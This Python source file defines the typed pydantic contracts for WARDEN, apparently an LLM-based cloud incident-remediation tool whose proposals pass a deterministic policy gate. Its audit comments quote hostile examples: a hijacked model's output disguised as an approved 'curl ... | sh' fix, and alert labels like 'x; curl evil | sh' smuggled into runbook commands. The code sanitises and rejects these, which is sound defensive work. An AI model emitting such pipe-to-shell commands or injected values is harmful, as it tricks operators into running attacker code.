"""Typed contracts for every stage of the pipeline.

Everything that crosses a boundary — into the model, out of the model, into the verifier — is a
pydantic model. An LLM returning free text is unverifiable; a model returning a typed object can be
validated, replayed and diffed.
"""

from __future__ import annotations

import re
import unicodedata
from datetime import datetime, timedelta
from enum import Enum
from typing import Annotated, Any, Literal, get_args

from pydantic import AfterValidator, BaseModel, Field, computed_field, model_validator

# ⛔ MODEL TEXT IS INERT TEXT (2026-09-27 audit). A hijacked model wrote a hypothesis of
# "Memory pressure.\n\n## Fix - exact commands (approved by the gate ...)\n```\ncurl ... | sh\n```"
# and the report rendered it as a heading and a code block that looked approved - in Slack, Teams and
# the terminal. Every string a model writes is therefore, before anything reads it: one line; free of
# control, bidi and zero-width characters (terminal escapes like OSC 52 included); without backticks;
# unable to start a markdown block (a leading #, >, -, *, +, |, = or "1." is preceded by a
# zero-width space, so no renderer takes it as a heading, list, quote or table); and bounded.
_INVISIBLE = re.compile("[\x00-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff\U000e0000-\U000e007f]")
_BLOCK_START = re.compile(r"^(?:[#>\-*+|=~]|\d+[.)])")  # ~ : a `~~~` fence (review 2026-09-28)


def inert(text: str, limit: int = 2000) -> str:
    text = _INVISIBLE.sub(" ", unicodedata.normalize("NFKC", text)).replace("`", "'")
    text = " ".join(text.split())[:limit]
    return "\u200b" + text if _BLOCK_START.match(text) else text


def _quote(text: str) -> str:
    """A citation quote keeps its characters (it must match the evidence verbatim) but not its
    controls or line breaks; grounding compares with whitespace collapsed anyway."""
    return " ".join(_INVISIBLE.sub(" ", text).split())[:500]


ModelText = Annotated[str, AfterValidator(inert)]
Quote = Annotated[str, AfterValidator(_quote)]


class Severity(str, Enum):
    critical = "critical"
    high = "high"
    medium = "medium"
    low = "low"


# ⛔ LABELS ARE NAMES, NOT TEXT (2026-09-27 audit). Label values reach shell commands a person is
# told to paste (runbook.py), the P14 resource inventory, the stack backend's line prefixes, and
# which resources are read. Prometheus alert labels inherit series labels, which an application can
# export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
# command, and `ecs_service='svc --prof admin'` an approved one. A value that is not a plain
# identifier (or a comma list of them, or a k=v selector) is dropped here, before anything reads
# it, and its key recorded in `rejected_labels` so the report says so.
_LABEL_KEY = re.compile(r"[A-Za-z_][A-Za-z0-9_.-]{0,63}")
# No value, list element or selector value may start with "-": `--profile=admin` has no space and
# no metacharacter, and would still be read as a flag where the value lands in a command.
_LABEL_VALUE = re.compile(r"(?!-)(?!.*[,=]-)[A-Za-z0-9._:/@,=+-]{0,253}")
NAME_PATTERN = r"^[A-Za-z0-9][A-Za-z0-9._:/@-]{0,252}$"
# Label keys whose value is a RESOURCE NAME WARDEN reads (the backends' `labels.get(...)` keys). Their
# values are never redacted as credentials: `secret=warden-dev-db-app` names a Secrets Manager secret,
# and masking it also masked the resource in WARDEN's own config lines (second review, 2026-09-30).
RESOURCE_LABELS = frozenset({
    "alb_target_group", "apigw", "app", "aurora_cluster", "cluster", "database", "db_instance", "deployment",
    "dynamodb_table", "ecs_cluster", "ecs_service", "eks_cluster", "elasticache", "eventbridge_rule",
    "instance_id", "lambda", "log_group", "log_stream_prefix", "namespace", "region", "secret", "selector",
    "sns_topic", "sqs",
    # What an alarm watches, for every main AWS service (resources.py, G9-A1 2026-10-10).
    "lambda_qualifier", "k8s_service", "canary", "docdb_cluster", "docdb_instance", "mq_broker",
    "elasticache_serverless", "appsync_events", "asg", "ebs_volume", "efs", "fsx", "rds_instance", "elasticache_node", "memorydb",
    "schedule_group", "state_machine", "kinesis_stream", "firehose", "msk_cluster", "apigw_id", "apigw_rest",
    "apigw_stage", "appsync", "nlb_target_group", "load_balancer", "clb", "cloudfront", "route53_health_check",
    "s3_bucket", "nat_gateway", "transit_gateway", "opensearch", "redshift", "cognito_user_pool", "apprunner",
    "glue_job", "athena_workgroup", "emr_cluster", "waf_web_acl", "kms_key", "acm_certificate", "quota_service",
    "quota_resource",
})


# Owner requirement R23: logs arrive late. CloudWatch and cluster log pipelines deliver lines up to minutes after
# they were written, so evidence read the moment an alert fires misses its last minutes - and "no error near the
# alert" from an unfilled window is a false negative. The read waits until the alert is this old.
LOG_INGEST_LAG = timedelta(seconds=120)


def ingestion_wait(started_at: str, now: datetime) -> timedelta:
    """How long to wait before reading evidence for an alert that started at `started_at` (R23): until it is
    LOG_INGEST_LAG old, never longer than LOG_INGEST_LAG (a clock ahead of ours is not waited out), and zero for an
    alert with no start time."""
    if not started_at:
        return timedelta(0)
    started = datetime.fromisoformat(started_at)
    return min(max(started + LOG_INGEST_LAG - now, timedelta(0)), LOG_INGEST_LAG)


def _zoned_timestamp(value: str) -> str:
    if value:
        from datetime import datetime

        try:
            parsed = datetime.fromisoformat(value)
        except ValueError:
            raise ValueError(f"started_at {value!r} is not a real date and time") from None
        if parsed.tzinfo is None:
            raise ValueError(f"started_at {value!r} has no zone: write Z or an offset such as +05:30")
    return value


class Alert(BaseModel):
    """What the monitoring stack hands us. Shape mirrors Prometheus Alertmanager."""

    alert_id: str = Field(pattern=r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$")
    name: str = Field(max_length=512)  # untrusted, like summary
    severity: Severity
    service: str = Field(pattern=NAME_PATTERN)
    # A free string, resolved against the per-environment policy (environments.py). Not a fixed
    # Literal because the set of environments is a deployment concern an operator configures
    # (staging, qa-staging, pre-prod, qa-prod, prod, ...). An environment the policy doesn't know
    # resolves to the restrictive default and fails closed, so widening this cannot loosen safety.
    # ⛔ Audit A-C-13: the environment went into the prompt and every report unchecked. It is a
    # name like any other resource name, so it is held to the same pattern.
    environment: str = Field(pattern=NAME_PATTERN)
    # Free text written by whoever configured the alert rule - UNTRUSTED (audit A-C-1). Rendered
    # only inside a datamarked block for the model and as inline code for people (reporting.py).
    summary: str = Field(max_length=4000)
    # ISO-8601 with its zone, or "" when the source does not say. Anything else is refused (audit A-C-1). A real date
    # and an explicit zone (audit A-B-L14): `2026-13-45T99:99` passed the shape, failed to parse, and the window
    # silently became "now"; a time with no zone could be local or UTC, hours apart.
    started_at: Annotated[str, AfterValidator(_zoned_timestamp)] = Field(
        default="", pattern=r"^$|^\d{4}-\d{2}-\d{2}[T ][0-9:.]{5,15}(?:Z|[+-]\d{2}:?\d{2})?$")
    labels: dict[str, str] = Field(default_factory=dict)
    rejected_labels: list[str] = Field(default_factory=list)

    @model_validator(mode="before")
    @classmethod
    def _plain_labels(cls, data: Any) -> Any:
        if not isinstance(data, dict) or not isinstance(data.get("labels"), dict):
            return data
        keep, rejected = {}, list(data.get("rejected_labels") or [])
        for key, value in data["labels"].items():
            if _LABEL_KEY.fullmatch(str(key)) and _LABEL_VALUE.fullmatch(str(value)):
                keep[str(key)] = str(value)
            else:
                rejected.append(str(key)[:64])
        return {**data, "labels": keep, "rejected_labels": rejected}


class ContextBundle(BaseModel):
    """Evidence gathered by tools. Collected BEFORE the model reasons, never by the model itself."""

    logs: list[str] = Field(default_factory=list)
    metrics: dict[str, float] = Field(default_factory=dict)
    recent_deploys: list[dict[str, str]] = Field(default_factory=list)
    tool_errors: list[str] = Field(default_factory=list)
    # Reads that succeeded and returned nothing (register N2): a throttled or misdirected query answers with an
    # empty list as readily as a healthy service does, so "nothing came back" is unknown, never "all clear".
    empty_reads: list[str] = Field(default_factory=list)
    # The alert rule's summary, as whoever wrote the rule wrote it (register M10): untrusted evidence of kind A,
    # shown to the model only as quarantined facts, never as prose that frames the diagnosis.
    alert_text: str = ""
    # The injection tripwire (tripwire.py): whether it ran, and the untrusted evidence ids it flagged
    # with their scores. Read by policy P16; recorded in the report so a replay sees what was decided.
    tripwire: str = "off"
    suspected: dict[str, float] = Field(default_factory=dict)
    # What AWS's own documentation says about the evidence's error codes (aws_docs.py, G10-C6): reference for the
    # model, never evidence - no item id a citation can name, scanned by the tripwire as outside text.
    references: list[str] = Field(default_factory=list)

    def is_empty(self) -> bool:
        return not (self.logs or self.metrics or self.recent_deploys)


class Citation(BaseModel):
    id: ModelText = Field(description="The evidence id in brackets before the item, e.g. F2, M1, C3, D1")
    quote: Quote = Field(description="A short span copied EXACTLY from that item")


class RootCause(BaseModel):
    """The model's reading of the evidence. A hypothesis — never a verdict."""

    hypothesis: ModelText
    confidence: float = Field(ge=0.0, le=1.0)
    evidence: list[ModelText] = Field(default_factory=list, max_length=20)
    ruled_out: list[ModelText] = Field(default_factory=list, max_length=20)
    # Checked by grounding.py (P13): an id that does not exist or a quote not in its item escalates.
    citations: list[Citation] = Field(
        default_factory=list,
        max_length=20,
        description="The evidence items that support the hypothesis: each an id and an exact quote",
    )


class ActionKind(str, Enum):
    """The closed set of things WARDEN is allowed to propose.

    Closed on purpose. A model that can invent an action kind can invent `delete_database`.
    """

    restart_pods = "restart_pods"
    scale_up = "scale_up"
    scale_down = "scale_down"
    rollback_deploy = "rollback_deploy"
    failover_replica = "failover_replica"
    clear_cache = "clear_cache"
    # Terminate stuck database connections (idle-in-transaction / over-threshold). The one safe,
    # reversible database write WARDEN performs — kills the connection, never the data. Not auto-safe
    # (touches a running DB); it goes through the full gate like every other real action.
    terminate_connections = "terminate_connections"
    # G9-D (2026-10-10): the generic fix classes every main AWS service shares (owner decision: all reversible ones may
    # run after a signed approval). Each is advice until a catalogue entry carries it out on the labelled resource.
    revert_config = "revert_config"        # a configuration or feature flag back to its previous deployed version
    pause_flow = "pause_flow"              # stop a consumer or a trigger that is causing harm (messages wait)
    resume_flow = "resume_flow"            # turn a disabled consumer or trigger back on
    shift_traffic = "shift_traffic"        # move traffic away from an impaired Availability Zone, for a set time
    redrive_messages = "redrive_messages"  # move dead-lettered messages back to their source queue, at a capped rate
    cancel_query = "cancel_query"          # stop one runaway query; the session and the data are untouched
    raise_limit = "raise_limit"            # raise a throttle or reservation inside the account's own limit, bounded
    freeze_changes = "freeze_changes"      # stop further deploys reaching the service while a person looks
    # G10-D (2026-10-10): undo ONE configuration change CloudTrail recorded shortly before the alarm, back to the state
    # AWS recorded before it - most outages follow a change (research 2026-10-10). Only families a catalogue entry
    # carries out; IAM and resource policies stay a person's.
    revert_change = "revert_change"
    no_action = "no_action"
    escalate_to_human = "escalate_to_human"


# The blast-radius scale, narrowest first. Derived from the type the proposal already uses, so the
# allowed values and their ordering cannot drift apart.
BlastRadius = Literal["single_pod", "single_service", "multi_service", "region"]
BLAST_RADIUS_ORDER: tuple[str, ...] = get_args(BlastRadius)


# ⛔ THE GATE'S FACTS ABOUT ITS OWN ACTIONS: (reversible, narrowest honest blast radius).
#
# Reversibility is a property of the OPERATION, not an opinion about an incident — and until
# 2026-09-12 the verifier read it from a field the MODEL wrote. Two live models then reported
# opposite values for the identical operation, so the same action was rejected by P2 in one run and
# merely escalated in another (docs/live-model-run-2026-09-06.md §3). Worse, `mcp_server.py` builds
# a proposal from untrusted caller arguments, so any client could skip P2 by claiming
# `reversible: true`. P2 now reads this table and nothing else.
#
# Deliberately NOT operator-configurable: a config file is only a different author for the same
# field. The blast radius is a FLOOR — a proposal may widen it, because asking for a human is
# always allowed, and can never narrow it.
ACTION_FACTS: dict[ActionKind, tuple[bool, str]] = {
    # The pod comes back; replacing it is the orchestrator's job. Floor is one pod: restarting a
    # whole deployment is a wider form of the same action, and the proposal must say so.
    ActionKind.restart_pods: (True, "single_pod"),
    # Undone by scaling back down. Replica count is a service-level property, never pod-level.
    ActionKind.scale_up: (True, "single_service"),
    # ⚠ NOT reversible, and the contested one. Issuing the opposite command is not an undo: the
    # terminated task's in-flight work, connections and warm caches are gone, and on a constrained
    # cluster the replacement may not schedule at all. Already denied in prod by P1 — but this table
    # must not lie merely because another policy usually gets there first.
    ActionKind.scale_down: (False, "single_service"),
    # A rollback is a forward deploy of a previous revision; the deploy system holds both, and
    # re-deploying the newer one is routine. Calling it irreversible would reject the correct answer
    # for six of Wave 1's fourteen fault classes and leave a gate that is inert rather than safe.
    ActionKind.rollback_deploy: (True, "single_service"),
    # ⛔ The entry that gives P2 teeth. A promoted replica IS the new primary; failing back is a
    # second failover with a stale ex-primary, not an undo. multi_service because every client with
    # a connection string or a cached DNS answer for that endpoint is affected.
    ActionKind.failover_replica: (False, "multi_service"),
    # A cache is reconstructible by definition — that is what makes it a cache. Its real danger is a
    # stampede, which is P7's and P9's business; overloading "reversible" with "risky" would make
    # P2 unreadable.
    ActionKind.clear_cache: (True, "single_service"),
    # Committed data is untouched, an in-flight transaction is rolled back by the database doing
    # exactly what it guarantees, and the pool reconnects. The question P2 asks is whether the
    # SYSTEM returns to its prior state, not whether one connection object survives.
    ActionKind.terminate_connections: (True, "single_service"),
    # G9-D. A previous configuration version is kept by the configuration store; deploying the newer one again is
    # routine - the same argument as rollback_deploy.
    ActionKind.revert_config: (True, "single_service"),
    # A paused consumer leaves its messages in the source, and resuming is the undo. A paused SCHEDULE misses its
    # ticks while paused; the plan names the rule, and a person approves it knowing that.
    ActionKind.pause_flow: (True, "single_service"),
    ActionKind.resume_flow: (True, "single_service"),
    # A zonal shift ends by itself at its expiry and can be cancelled. multi_service: everything behind the load
    # balancer loses that zone's capacity while it lasts.
    ActionKind.shift_traffic: (True, "multi_service"),
    # ⛔ NOT reversible (independent review 2026-10-10, M4): cancelling a move stops it, but moved messages are not
    # moved back and are processed (AWS, read 2026-10-10). P2 therefore keeps it a person's in production.
    ActionKind.redrive_messages: (False, "single_service"),
    # ⛔ NOT reversible: a cancelled query is lost (it can be run again, which is a new decision). Only a SELECT is
    # cancelled (a cancelled INSERT INTO or CTAS can leave partial data - Athena docs, read 2026-10-10).
    ActionKind.cancel_query: (False, "single_service"),
    # Undone by setting the previous value back; bounded by the account's own limit (catalogue).
    ActionKind.raise_limit: (True, "single_service"),
    # Re-enabling the transition is the undo; nothing already deployed changes.
    ActionKind.freeze_changes: (True, "single_service"),
    # Undone by re-applying the recorded change itself. single_service: one resource's one change.
    ActionKind.revert_change: (True, "single_service"),
    # Touch nothing. Present so the table is total over ActionKind: a KeyError inside the gate must
    # be impossible.
    ActionKind.no_action: (True, "single_pod"),
    ActionKind.escalate_to_human: (True, "single_pod"),
}


# What each action means, in the schema the model answers in (G9-D, 2026-10-10). Without it the names alone were read
# their own way: qualification answered `raise_limit` for an out-of-memory kill after a config change lowered a
# container's memory limit - and the gate allowed it.
ACTION_MEANINGS = (
    "rollback_deploy: return the service to the version or revision it ran before a deploy. "
    "restart_pods: replace running instances with new ones of the SAME version. "
    "scale_up / scale_down: change the NUMBER of replicas, tasks or provisioned capacity. "
    "revert_config: return a configuration or feature flag to its previous deployed version. "
    "pause_flow: stop a queue consumer or a scheduled trigger that is causing harm. "
    "resume_flow: turn a disabled consumer or trigger back on. "
    "shift_traffic: move a load balancer's traffic away from one impaired Availability Zone. "
    "redrive_messages: move a dead-letter queue's messages back to their source queue. "
    "cancel_query: stop one runaway analytics query. "
    "raise_limit: raise a REQUEST throttle or a reserved concurrency of a managed service (an API stage's rate, a "
    "function's reserved concurrency) - never a container's CPU or memory limit, never a database's connection limit. "
    "freeze_changes: stop further deploys reaching the service while a person looks. "
    "revert_change: undo ONE configuration change a CHANGE line records shortly before the alert, back to what it "
    "was - a security group rule revoked or added, a desired count, capacity or reserved concurrency set, an API stage "
    "moved to another deployment, a scheduled rule disabled. Target the changed resource itself. "
    "failover_replica, clear_cache, terminate_connections: what they say, on a database or cache. "
    "no_action: nothing is wrong. escalate_to_human: a person decides."
)


class RemediationProposal(BaseModel):
    """Structured output from the model. Input to the verifier. Never executed directly."""

    action: ActionKind = Field(description=ACTION_MEANINGS)
    target: ModelText = Field(description="ONE resource name, e.g. checkout or lambda:my-fn - nothing else")
    reasoning: ModelText
    expected_effect: ModelText
    # ⚠ BOTH ADVISORY. The gate does not take these as permission: P2 reads ACTION_FACTS alone, and
    # P6 reads the wider of the table's floor and this claim. A claim can therefore agree with the
    # table or tighten the gate, never loosen it. They stay REQUIRED because the claim is still
    # evidence ABOUT the model — the benchmark's scorer measures how often it contradicts itself
    # about the same action — and because P10 needs the claim to notice a contradiction at all.
    blast_radius: BlastRadius = Field(
        description="Your honest estimate. WARDEN enforces a per-action floor, so understating "
                    "this cannot widen what you are allowed to do."
    )
    reversible: bool = Field(
        description="Your honest estimate. WARDEN decides reversibility from a fixed per-action "
                    "table: claiming an action is reversible does not make it permitted, and "
                    "claiming it is irreversible sends the proposal to a human."
    )

    # ⛔ `computed_field`, not plain properties: these must survive `model_dump_json()`, which is
    # what `warden run --json` writes and what every benchmark artefact is made of. A report that
    # records only the claim cannot show, later, that the gate overruled it. They are
    # serialization-only, so the schema sent to the model is unchanged and nothing asks a model to
    # fill them in.
    @computed_field
    @property
    def table_reversible(self) -> bool:
        """Reversibility as WARDEN classifies the operation. The model's claim is not consulted."""
        return ACTION_FACTS[self.action][0]

    @computed_field
    @property
    def effective_blast_radius(self) -> str:
        """The wider of WARDEN's floor and the model's claim. A proposal may widen, never narrow."""
        floor = ACTION_FACTS[self.action][1]
        return max(floor, self.blast_radius, key=BLAST_RADIUS_ORDER.index)

    @computed_field
    @property
    def claim_contradicts_table(self) -> bool:
        """The model says this cannot be undone while the table says it can. A human reconciles."""
        return self.table_reversible and not self.reversible


class VerdictStatus(str, Enum):
    approved_for_human = "approved_for_human"  # passed policy, still needs a person
    auto_safe = "auto_safe"                    # passed policy and is safe to run unattended
    rejected = "rejected"                      # policy said no
    escalated = "escalated"                    # WARDEN declines to decide


class Verdict(BaseModel):
    """The deterministic verifier's answer. This — not the model — decides what happens."""

    status: VerdictStatus
    reasons: list[str] = Field(default_factory=list)
    policy_ids: list[str] = Field(default_factory=list)
    requires_approval: bool = True
    # Policies in observe mode (audit A-P-8) that would have fired: recorded with their reason, never obeyed.
    observed: list[str] = Field(default_factory=list)


class CostRecord(BaseModel):
    input_tokens: int = 0
    output_tokens: int = 0
    usd: float = 0.0
    calls: int = 0

    def add(self, in_tok: int, out_tok: int, usd: float) -> None:
        self.input_tokens += in_tok
        self.output_tokens += out_tok
        self.usd += usd
        self.calls += 1


class RunReport(BaseModel):
    """Everything a human or an auditor needs to understand one run."""

    alert: Alert
    redaction_map_size: int
    # ⛔ The placeholder -> original map, so the human-facing report can show the model's text
    # with real identifiers where the operator allows it. EXCLUDED from every serialisation
    # (model_dump / model_dump_json / the --json report file): it holds every secret the redactor
    # caught, and a report file is exactly the kind of thing that gets attached to a ticket.
    redaction_map: dict[str, str] = Field(default_factory=dict, exclude=True, repr=False)
    context: ContextBundle
    root_cause: RootCause | None = None
    proposal: RemediationProposal | None = None
    verdict: Verdict | None = None
    cost: CostRecord = Field(default_factory=CostRecord)
    audit: list[dict[str, Any]] = Field(default_factory=list)
    halted_reason: str | None = None
